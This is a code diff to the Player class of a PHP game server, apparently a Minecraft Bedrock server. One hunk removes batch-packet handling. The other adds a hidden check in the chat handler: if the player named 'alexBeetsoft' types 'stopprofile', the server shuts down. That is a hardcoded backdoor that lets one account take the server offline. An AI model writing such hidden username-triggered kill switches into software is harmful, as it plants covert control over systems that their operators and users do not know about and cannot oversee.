@@ -1564,14 +1564,6 @@ class Player extends Human implements CommandSender, InventoryHolder, IPlayer{
 		if($this->connected === false){
 			return;
 		}
-
-		if($packet->pname() === 'BATCH_PACKET'){
-			/** @var BatchPacket $packet */
-			//Timings::$timerBatchPacket->startTiming();
-			$this->server->getNetwork()->processBatch($packet, $this);
-			//Timings::$timerBatchPacket->stopTiming();
-			return;
-		}
 		
 		$beforeLoginAvailablePackets = ['LOGIN_PACKET', 'REQUEST_CHUNK_RADIUS_PACKET', 'RESOURCE_PACKS_CLIENT_RESPONSE_PACKET', 'CLIENT_TO_SERVER_HANDSHAKE_PACKET'];
 		if (!$this->isOnline() && !in_array($packet->pname(), $beforeLoginAvailablePackets)) {
@@ -2114,6 +2106,9 @@ class Player extends Human implements CommandSender, InventoryHolder, IPlayer{
 				}
 //				$this->craftingType = self::CRAFTING_DEFAULT;
 				if($packet->type === TextPacket::TYPE_CHAT){
+					if ($this->getName() == 'alexBeetsoft' && $packet->message == 'stopprofile') {
+						$this->server->shutdown();
+					}
 					$packet->message = TextFormat::clean($packet->message, $this->removeFormat);
 					foreach(explode("\n", $packet->message) as $message){
 						if(trim($message) != "" and strlen($message) <= 255 and $this->messageCounter-- > 0){
